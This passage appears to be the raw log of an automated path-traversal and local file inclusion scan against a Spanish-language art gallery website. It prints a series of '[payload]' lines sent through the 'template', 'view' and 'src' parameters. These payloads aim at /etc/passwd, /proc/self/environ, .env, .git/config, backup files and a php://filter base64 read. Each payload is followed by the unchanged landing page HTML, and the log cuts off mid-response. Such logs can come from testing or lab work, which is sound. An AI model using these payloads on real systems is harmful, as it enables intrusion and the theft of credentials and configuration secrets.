            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] template=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: view
[payload] view=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] view=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: src
[payload] src=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
